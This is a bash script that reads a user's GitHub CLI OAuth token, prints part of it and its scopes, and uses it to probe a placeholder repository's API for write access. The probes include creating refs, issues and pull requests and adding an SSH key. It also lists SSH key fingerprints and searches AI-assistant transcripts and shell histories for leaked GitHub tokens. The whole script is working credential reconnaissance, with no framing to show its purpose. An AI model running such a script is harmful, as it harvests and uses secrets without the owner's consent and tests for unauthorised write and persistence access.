set +e
REPO="__REPO__"
TOKEN=$(awk '/oauth_token:/{print $2}' "$HOME/.config/gh/hosts.yml" 2>/dev/null | tr -d '"' | head -1)
echo "host=$(hostname)"
echo "token_prefix=$(printf '%s' "$TOKEN" | cut -c1-16)"
echo "token_fp=$(printf '%s' "$TOKEN" | sha256sum | cut -c1-12)"
echo "scopes=$(gh auth status 2>&1 | sed -n 's/.*Token scopes: //p' | head -1 | tr -d "'")"
echo "login=$(gh api user --jq .login 2>/dev/null)"

with_token() {
  if [ -n "$3" ]; then
    curl -s -o /dev/null -w '%{http_code}' -X "$1" -H "Authorization: token $TOKEN" \
      -H "Accept: application/vnd.github+json" -d "$3" "https://api.github.com$2"
  else
    curl -s -o /dev/null -w '%{http_code}' -X "$1" -H "Authorization: token $TOKEN" \
      -H "Accept: application/vnd.github+json" "https://api.github.com$2"
  fi
}

anon() {
  if [ -n "$3" ]; then
    curl -s -o /dev/null -w '%{http_code}' -X "$1" -H "Accept: application/vnd.github+json" \
      -d "$3" "https://api.github.com$2"
  else
    curl -s -o /dev/null -w '%{http_code}' -X "$1" -H "Accept: application/vnd.github+json" \
      "https://api.github.com$2"
  fi
}

echo "cap_traffic_read=$(with_token GET "/repos/$REPO/traffic/views")"
echo "cap_traffic_read_anon=$(anon GET "/repos/$REPO/traffic/views")"
echo "cap_actions_read=$(with_token GET "/repos/$REPO/actions/workflows")"
echo "cap_actions_read_anon=$(anon GET "/repos/$REPO/actions/workflows")"
echo "cap_contents_write=$(with_token POST "/repos/$REPO/git/refs" '{"ref":"refs/heads/","sha":"0000000000000000000000000000000000000000"}')"
echo "cap_contents_write_anon=$(anon POST "/repos/$REPO/git/refs" '{"ref":"refs/heads/","sha":"0000000000000000000000000000000000000000"}')"
echo "cap_issues_write=$(with_token POST "/repos/$REPO/issues" '{}')"
echo "cap_pulls_write=$(with_token POST "/repos/$REPO/pulls" '{}')"
echo "cap_admin_read=$(with_token GET "/repos/$REPO/actions/permissions")"
echo "cap_ssh_key_write=$(with_token POST "/user/keys" '{"title":"notnote-probe","key":"ssh-ed25519 INVALID"}')"

echo "ssh_keys=$(for k in "$HOME"/.ssh/*.pub; do [ -e "$k" ] && ssh-keygen -lf "$k" 2>/dev/null | awk '{print $2}'; done | paste -sd, -)"
echo "transcript_hits=$(timeout 25 grep -rhoE 'gho_[A-Za-z0-9]{30,}|ghp_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}' "$HOME/.claude/transcripts" 2>/dev/null | wc -l | tr -d ' ')"
echo "history_hits=$(cat "$HOME"/.bash_history "$HOME"/.zsh_history 2>/dev/null | grep -cE 'gho_[A-Za-z0-9]{30,}|ghp_[A-Za-z0-9]{30,}|github_pat_' | tr -d ' ')"
exit 0
